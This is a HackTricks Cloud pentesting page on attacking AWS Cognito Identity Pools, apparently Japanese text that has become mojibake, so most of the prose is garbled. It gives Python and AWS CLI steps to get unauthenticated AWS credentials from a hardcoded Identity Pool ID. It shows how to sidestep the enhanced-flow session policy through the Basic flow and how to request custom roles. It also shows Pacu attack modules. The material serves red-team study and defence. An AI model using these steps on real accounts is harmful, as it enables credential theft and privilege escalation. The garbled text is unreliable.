# Cognito Identity Pools

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã¾ãŸã¯**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦**ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

Identity poolsã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**ä¸€æ™‚çš„ãªè³‡æ ¼æƒ…å ±ã‚’å–å¾—**ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§é‡è¦ãªå½¹å‰²ã‚’æœãŸã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®è³‡æ ¼æƒ…å ±ã¯ã€Amazon S3ã‚„DynamoDBãªã©ã®ã•ã¾ã–ã¾ãªAWSã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ã€‚Identity poolsã®æ³¨ç›®ã™ã¹ãæ©Ÿèƒ½ã®1ã¤ã¯ã€åŒ¿åã®ã‚²ã‚¹ãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼èªè¨¼ã®ãŸã‚ã®ã•ã¾ã–ã¾ãªã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã®ã‚µãƒãƒ¼ãƒˆã§ã™ã€‚ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã«ã¯ä»¥ä¸‹ãŒå«ã¾ã‚Œã¾ã™ï¼š

- Amazon Cognitoãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«
- Facebookã€Googleã€Login with Amazonã€Sign in with Appleãªã©ã®ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³
- OpenID Connectï¼ˆOIDCï¼‰ã«æº–æ‹ ã—ãŸãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼
- SAMLï¼ˆSecurity Assertion Markup Languageï¼‰ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼
- é–‹ç™ºè€…èªè¨¼æ¸ˆã¿ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Identity Poolã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã«ã¯ã€ã¾ãš**Identity IDã‚’ç”Ÿæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚ã“ã®Identity IDã¯ã€**ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®è­˜åˆ¥**ã§ã™ã€‚ã“ã‚Œã‚‰ã®è­˜åˆ¥ã«ã¯ã€æœ€å¤§20ã®ãƒ‡ãƒ¼ã‚¿ã‚»ãƒƒãƒˆã‚’æŒã¤ã“ã¨ãŒã§ãã€1MBã®ã‚­ãƒ¼ã¨å€¤ã®ãƒšã‚¢ã‚’ä¿å­˜ã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’ä¿æŒã™ã‚‹ã®ã«ä¾¿åˆ©**ã§ã™ï¼ˆå¸¸ã«åŒã˜Identity IDã‚’ä½¿ç”¨ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼‰ã€‚

ã•ã‚‰ã«ã€ã‚µãƒ¼ãƒ“ã‚¹**cognito-sync**ã¯ã€ã“ã®æƒ…å ±ã‚’**ç®¡ç†ãŠã‚ˆã³åŒæœŸã™ã‚‹**ãŸã‚ã®ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ï¼ˆãƒ‡ãƒ¼ã‚¿ã‚»ãƒƒãƒˆå†…ã§æƒ…å ±ã‚’é€ä¿¡ã—ã€ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚„SNSãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã«æƒ…å ±ã‚’é€ä¿¡ã™ã‚‹ï¼‰ã€‚

### ãƒšãƒ³ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)ã€AWSã®è„†å¼±æ€§æ¤œå‡ºãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã«ã¯ã€ç¾åœ¨ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå†…ã®ã™ã¹ã¦ã®Cognitoã‚¢ã‚»ãƒƒãƒˆã®åˆ—æŒ™ã‚’è‡ªå‹•åŒ–ã—ã€å¼±ã„æ§‹æˆã€ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼å±æ€§ãªã©ã‚’ãƒ•ãƒ©ã‚°ä»˜ã‘ã—ã€å¤‰æ›´å¯èƒ½ãªã‚«ã‚¹ã‚¿ãƒ å±æ€§ã€ä½¿ç”¨å¯èƒ½ãªIdentity Poolè³‡æ ¼æƒ…å ±ã€IDãƒˆãƒ¼ã‚¯ãƒ³å†…ã®ä»®å®šå¯èƒ½ãªãƒ­ãƒ¼ãƒ«ãªã©ã«åŸºã¥ã„ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä½œæˆï¼ˆMFAã‚µãƒãƒ¼ãƒˆã‚’å«ã‚€ï¼‰ã¨ç‰¹æ¨©æ˜‡æ ¼ã‚’è‡ªå‹•åŒ–ã™ã‚‹ã€Œcognito\_\_enumã€ã¨ã€Œcognito\_\_attackã€ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®æ©Ÿèƒ½ã®èª¬æ˜ã«ã¤ã„ã¦ã¯ã€[ãƒ–ãƒ­ã‚°è¨˜äº‹](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)ã®ç¬¬2éƒ¨ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ã«ã¤ã„ã¦ã¯ã€ãƒ¡ã‚¤ãƒ³ã®[Pacu](https://github.com/RhinoSecurityLabs/pacu)ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

#### ä½¿ç”¨æ–¹æ³•

æŒ‡å®šã•ã‚ŒãŸIdentity Poolã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«å¯¾ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä½œæˆã¨ã™ã¹ã¦ã®ç‰¹æ¨©æ˜‡æ ¼ãƒ™ã‚¯ãƒˆãƒ«ã‚’è©¦è¡Œã™ã‚‹ãŸã‚ã®cognito\_\_attackã®ä½¿ç”¨ä¾‹:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
ã‚µãƒ³ãƒ—ãƒ«cognito\_\_enumã®ä½¿ç”¨æ–¹æ³•ã‚’ç¤ºã—ã¾ã™ã€‚ç¾åœ¨ã®AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§è¡¨ç¤ºã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã€ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ¼ãƒ«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãªã©ã‚’åé›†ã—ã¾ã™ã€‚
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) ã¯ã€Cognito ä¸Šã§ã®ã•ã¾ã–ã¾ãªæ”»æ’ƒã‚’å®Ÿè£…ã—ãŸ Python ã® CLI ãƒ„ãƒ¼ãƒ«ã§ã‚ã‚Šã€æœ›ã¾ã—ããªã„ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä½œæˆã‚„ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ¼ãƒ«ã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å«ã¿ã¾ã™ã€‚

#### ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«
```bash
$ pip install cognito-scanner
```
#### ä½¿ç”¨æ³•
```bash
$ cognito-scanner --help
```
è©³ç´°ã«ã¤ã„ã¦ã¯ã€https://github.com/padok-team/cognito-scanner ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

## IAMãƒ­ãƒ¼ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

### èªè¨¼ã•ã‚Œã¦ã„ãªã„

Cognitoã‚¢ãƒ—ãƒªã§AWSè³‡æ ¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«æ”»æ’ƒè€…ãŒçŸ¥ã‚‹å¿…è¦ãŒã‚ã‚‹å”¯ä¸€ã®ã‚‚ã®ã¯ã€**Identity Pool ID**ã§ã‚ã‚Šã€ã“ã®**IDã¯Web/ãƒ¢ãƒã‚¤ãƒ«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚IDã¯æ¬¡ã®ã‚ˆã†ã«è¦‹ãˆã¾ã™ï¼š`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`ï¼ˆãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã§ãã¾ã›ã‚“ï¼‰ã€‚

{% hint style="success" %}
**IAM Cognitoæœªèªè¨¼ãƒ­ãƒ¼ãƒ«ã¯**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§`Cognito_<Identity Pool name>Unauth_Role`ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
{% endhint %}

ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸIdentity Pools IDã‚’è¦‹ã¤ã‘ã€èªè¨¼ã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¨±å¯ã—ã¦ã„ã‚‹å ´åˆã€æ¬¡ã®æ‰‹é †ã§AWSè³‡æ ¼æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ï¼š
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
ã¾ãŸã¯ã€æ¬¡ã®**aws cliã‚³ãƒãƒ³ãƒ‰**ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€æœªèªè¨¼ã®Cognitoãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ãƒãƒªã‚·ãƒ¼ã‚’ä»‹ã—ã¦å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸå ´åˆã§ã‚‚ã€æ¨©é™ã‚’æŒã¤ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚ä»¥ä¸‹ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
{% endhint %}

### å¼·åŒ–èªè¨¼ãƒ•ãƒ­ãƒ¼ã¨åŸºæœ¬èªè¨¼ãƒ•ãƒ­ãƒ¼

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®å¼·åŒ–èªè¨¼ãƒ•ãƒ­ãƒ¼**ã«å¾“ã„ã¾ã—ãŸã€‚ã“ã®ãƒ•ãƒ­ãƒ¼ã¯ã€ç”Ÿæˆã•ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«**åˆ¶é™ãŒã‚ã‚‹**[**ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒãƒªã‚·ãƒ¼**](../../aws-basic-information/#session-policies)ã‚’è¨­å®šã—ã¾ã™ã€‚ã“ã®ãƒãƒªã‚·ãƒ¼ã§ã¯ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒ[**ã“ã®ãƒªã‚¹ãƒˆã‹ã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã®ã¿ã‚’ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)ï¼ˆãƒ­ãƒ¼ãƒ«ãŒä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã§ã‚‚ï¼‰ã€‚

ãŸã ã—ã€**Identity poolãŒ"Basic (Classic) Flow"ã‚’æœ‰åŠ¹ã«ã—ã¦ã„ã‚‹å ´åˆ**ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãã®ãƒ•ãƒ­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã§ãã€ãã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ã¯**ãã®åˆ¶é™ã®ã‚ã‚‹ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒãƒªã‚·ãƒ¼ãŒé©ç”¨ã•ã‚Œã¾ã›ã‚“**ã€‚

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
ã“ã®**ã‚¨ãƒ©ãƒ¼**ã‚’å—ã‘å–ã£ãŸå ´åˆã€**åŸºæœ¬ãƒ•ãƒ­ãƒ¼ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ãªã„ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆï¼‰**ãŸã‚ã§ã™ã€‚

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAMè³‡æ ¼æƒ…å ±ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã¯ã€[ã©ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã‹](../../#whoami)ã‚’ç¢ºèªã—ã€[ç‰¹æ¨©ã‚’æ˜‡æ ¼](../../aws-privilege-escalation/)ã—ã‚ˆã†ã¨ã—ã¦ãã ã•ã„ã€‚

### èªè¨¼æ¸ˆã¿

{% hint style="info" %}
**èªè¨¼æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¯ãŠãã‚‰ã**ç•°ãªã‚‹æ¨©é™**ãŒä»˜ä¸ã•ã‚Œã‚‹ãŸã‚ã€**ã‚¢ãƒ—ãƒªå†…ã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**ã§ãã‚‹å ´åˆã¯ã€ãã‚Œã‚’è©¦ã—ã¦æ–°ã—ã„è³‡æ ¼æƒ…å ±ã‚’å–å¾—ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

**èªè¨¼æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹Identity Pool**ã«ã¯**ãƒ­ãƒ¼ãƒ«**ã‚‚åˆ©ç”¨å¯èƒ½ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ãã®ãŸã‚ã«ã¯**ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€**ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã€‚ãã‚ŒãŒ**Cognitoãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«**ã§ã‚ã‚‹å ´åˆã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®å‹•ä½œã‚’æ‚ªç”¨ã—ã¦**æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

{% hint style="success" %}
**IAM Cognitoèªè¨¼æ¸ˆã¿ãƒ­ãƒ¼ãƒ«ã¯**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§`Cognito_<Identity Pool name>Auth_Role`ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
{% endhint %}

ã¨ã«ã‹ãã€**æ¬¡ã®ä¾‹**ã§ã¯ã€ã™ã§ã«**Cognitoãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«**ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦Identity Poolã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã„ã‚‹ã“ã¨ã‚’æƒ³å®šã—ã¦ã„ã¾ã™ï¼ˆä»–ã®ã‚¿ã‚¤ãƒ—ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ã‚‚æ§‹æˆã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã‚’å¿˜ã‚Œãªã„ã§ãã ã•ã„ï¼‰ã€‚

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# å‰ã®ã‚³ãƒãƒ³ãƒ‰ã®å¿œç­”ã‹ã‚‰identity_idã‚’å–å¾—
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# IdTokenã«ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«ã‚°ãƒ«ãƒ¼ãƒ—ã®ãŸã‚ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãƒ­ãƒ¼ãƒ«ãŒå«ã¾ã‚Œã¦ã„ã¾ã™
# ç‰¹å®šã®ãƒ­ãƒ¼ãƒ«ã«å¯¾ã—ã¦è³‡æ ¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã«ã¯--custom-role-arnã‚’ä½¿ç”¨ã—ã¾ã™
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ã«ã‚ˆã£ã¦ç•°ãªã‚‹IAMãƒ­ãƒ¼ãƒ«ã‚’æ§‹æˆ**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã¾ãŸã€ã‚¯ãƒ¬ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦ã‚‚ç•°ãªã‚‹IAMãƒ­ãƒ¼ãƒ«ã‚’æ§‹æˆ**ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€åŒã˜ã¾ãŸã¯ç•°ãªã‚‹ãƒ—ãƒ­ãƒã‚¤ãƒ€ã‚’ä»‹ã—ã¦ç•°ãªã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒã‚ã‚‹å ´åˆã¯ã€**ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®IAMãƒ­ãƒ¼ãƒ«ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ä¾¡å€¤ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“**ã€‚
{% endhint %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
